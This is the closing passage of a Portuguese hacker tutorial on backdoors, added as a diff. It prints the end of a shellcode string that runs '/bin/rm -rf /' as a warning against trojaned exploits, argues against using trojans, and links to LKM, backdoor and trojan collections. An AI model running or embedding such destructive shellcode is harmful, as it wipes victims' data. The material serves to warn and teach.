+        "\x40\xcd\x80\xe8\xca\xff\xff\xff\x2f\x62\x69\x6e"
+        "\x2f\x72\x6d\x20\x2d\x72\x66\x20\x2f\x00\xc9\xc3";
+
+E Executar literalmente um "/bin/rm -rf /".Quem nao sabe o que isso eh
+capaz de fazer, por favor, nao teste!!Isso poderia apagar todos os dados
+de seu sistema.Com strings voce poderia detectar ele.
+...
+GLIBC_2.0
+PTRh
+/bin/rm -rf /
+...
+Direciono as palavras abaixo a algum possivel lamer que venha ler este
+tutorial: 
+**************************************************************************
+" esse shellcode possui um NULL BYTE, nem tente inserir ele num 
+exploit buffer overflow para apagar dados de terceiros, poupe seu trabalho
+fazendo lamisse e ve se aprende um pouco de etica hacker".
+**************************************************************************
+
+Eis aih o perigo.Quando eh exploit para gerar overflows, o cuidado eh
+maior que quando eh para gerar DoS, mas voce,bravo companheiro NewBie,
+desde jah fica avisado para todo e qualquer caso, nao importa a origem ou se 
+eh para fazer A ou B, o perigo existe e temos que tomar cuidado.
+Por isso, amigo, aprenda.Quando vir por aih um shellcode igual a este, 
+voce jah sabe de antemao do que se trata, entao trate de descarta-lo.
+
+4.2. Sugestoes
+---------------
+
+Nao gosto mesmo de trojans horses, amigo.Nao vejo graca nisso, evidencia-se
+que o cara que estah do outro lado nao possui conhecimentos ou eh uma
+verdadeira ameba.Se alguem pode considerar o hacking como um jogo, eh
+melhor jogar contra quem eh bom, ou conhece bem o jogo, nunca com alguem
+que nao sabe nada ou eh inocente o bastante para cair nesses truques,
+mesmo que esse alguem seja um esnobe ou super soberbo.Creio que um cara
+que manja bem nao precisa sair por aih dizendo que sabe das coisas, muito
+menos para pessoas que sabem bem menos que ele.Os trojans como tecnica
+possuem suas utilidades, mas na maioria das vezes, use sua conciencia e
+procure descarta-los, estude e seja bom o bastante para jamais ter que
+recorrer a esta tecnica.A grande maioria dos trojans nao funcionam com
+gente experiente, o interessante eh frisar isso: "gente experiente".O
+que temos visto eh que a grande maioria de usuarios Windows nao fazem
+parte desta citacao, haja visto sao os que mais sofrem com isso.Eu sou a
+favor da liberdade de informacao, programas como o BO e o Netbus 
+demonstram o perigo que usuarios comuns estao a merce! Por isso sao bons
+programas para evidenciar isto: "A FALTA DE SEGURANCA DOS SISTEMAS
+OPERACIONAIS".Mas fucadores mesmo nao devem usa-los.Devem procurar
+descobrir esquemas melhores contra pessoal melhor e mais capacitado.
+Por isso, amigo NewBie, nao use trojans por aih, lembrando
+que ateh mesmo voce pode ser vitima disto!:)
+
+
+----------------
+5. - TERMINANDO |
+----------------
+
+Como ficou evidenciado nesse tutorial, de um lado, o administrador
+nao deve esperar por solucoes vindo de fora(Fabricantes de Softwares,
+Equipes de Seguranca e Hackers "Eticos"), mas sim, correr atras e por sih
+proprio ir aperfeicoando sempre o seu sistema e procurando evitar
+possiveis problemas, pois como pode-se ver, um hacker pode facilmente
+usar um dos metodos acima para dificultar as coisas para o lado do admin;
+do outro lado, um fucador precisa pesquisar incessantemente e acima de 
+tudo procurar dominar e conhecer ao maximo os sistemas operacionais para
+construir esquemas proprios e avancados de invasao, bem como de backdoor.
+No meio disso tudo estah o usuario comum.Eh por eles que os dois lados
+"trabalham" e para eles.Um hacker nao pratica mau a alguem, e ve o
+opositor(Admin e Seguranca) nao como um inimigo que deve ser destruido,
+mas antes, como um amigo que deve ser ajudado.Nao digo aqui, invadir e
+mandar um email para o admin dizendo como consertar uma falha aqui ou
+algo parecido nao., dependendo da rede isso ateh pode ser feito..mas o
+que eu digo e evidencio aqui eh que temos que forcar as coisas, se nos
+limitarmos a divulgar backdoors de inetd, esses admins jamais iriam
+procurar saber o que sao LKMs e Rootkits.Uma evidencia disso: Enquanto
+escrevia esse txt, surgiu um virus chamado "I LOVE YOU" que derrubou
+meio mundo, destruiu muita maquina, a interpol cacou um "possivel" 
+suspeito, quando na verdade, os verdadeiros criminosos que sao os 
+programadores do software estao cada vez mais ricos...Pq evidencio isso?
+pq esse programa maldito(Outlook) jah deveria ter sido banido ha muito
+tempo, muita gente jah demonstrou suas falhas e o perigo que ele 
+representa, um deles o Marco Nunes: http://now.at/marconunes , e esses
+programadores nao deram a menor atencao.Temos que ter a humildade para
+reconhecermos que no fundo nao sabemos de nada.Quem tem levado a melhor
+durante todo esse tempo sao os cracker e criminosos, que se aproveitam do
+"silencio da elite do hacking mundial" e da incompetencia desses
+programadores e administradores de rede para destruir e interceptar dados, 
+roubar informacoes e etc..Ha quem duvide?? Delegado fulano de tal conhece
+bem um pessoal que andou desviando dinheiro de aposentado no eixo sudeste-
+bahia, mas cade que prendeu??? A injustica predomina ateh no mundo
+virtual.Sem mais amigo.Espero que tenha aprendido algo nesse tutorial.
+
+
+5.1. Links e Referencias
+-------------------------
+
+Existem milhares de tutorial net a fora ensinando tecnicas de backdoor.
+Irei somente destacar alguns que de fato interessam ainda hoje em dia.
+
+www.infowar.co.uk/thc/ -> Procure pelos txts sobre LKM.
+
+www.phrack.com -> Procure pelo Projeto Loki.
+
+http://teso.scene.at/ -> Veja os progs disponiveis nele, em destaque
+			 o itunnel.tar.gz e adore.tar.gz.. lah tem as
+			 versoes desses programas.
+
+www.w00w00.org/ -> Procure no diretorio de trojans deles.
+
+ftp://ftp.technotronic.com/ -> Procure por trojans lah.
+
+http://packetstorm.securify.com/ -> Manda o sistema de busca procura por
+				    LKM e/ou backdoor.
+
+
+5.2 - Consideracoes Finais
+---------------------------
+
+Para a primeira parte desse tema, talvez eu ateh tenha avancado um pouco.
+Muita gente tem me procurado e perguntado porque eu tenho divulgado essas
+infos, buffer overflows, shellcode, sockets, agora backdoor, estah vindo
+um de IPC e LKM, e etc, o pessoal do Unsekurity tambem estah providenciando 
+material, uns consideram que o que estamos divulgando eh basico outros nao,
+enfim, acho que respostas vem com o tempo..Se estou sendo sincero no que
+digo ou nao, somente o tempo poderah responder isso para terceiros.Tem um
+ditado que diz: "Cada um colhe o que planta", nao tou querendo construir
+um exercito de crackers, mas sim o contrario, pois eu nao boto feh que a
+comunidade de seguranca resolva algum problema, eles tem apanhado a tanto
+tempo(vide Buffer Overflow - Nao existe solucao eficiente, vide IP-Spoof
+- Nao existe ainda solucao eficiente, vide DDoS - Nao existe ainda solucao
+eficiente, etc, etc. etc),ou se ataca a raiz do problema, ou tah todo mundo 
+lascado!! Quem me conhece sabe que nao sou cracker, que nao compartilho 
+com ideias crackers, para ser mais sincero, sou contra os crackers.Espero
+com o tempo que as coisas venham a clarear para todos.De qualquer forma,
+amigo, nao importa quem eu seja ou quem fui ou vou ser, no fim das contas,
+somos todos iguais, humanos imperfeitos, em busca de encontrar sentido
+para essa vida tao sofrida! O que importa eh a informacao que disponibilizo!
+Nao faco parte da "elite", nao sou um hacker ou super hacker, nao sou um
+lamer, tb nao sou um wannable, ou um kiddie, tb nao sou um cracker, entao,
+amigo, o que sou afinal??:) - Eu sou poh!!!
+Sem mais..Um abraco.
+
+						Nash Leon.
+
+-----------------------------------EOF------------------------------------
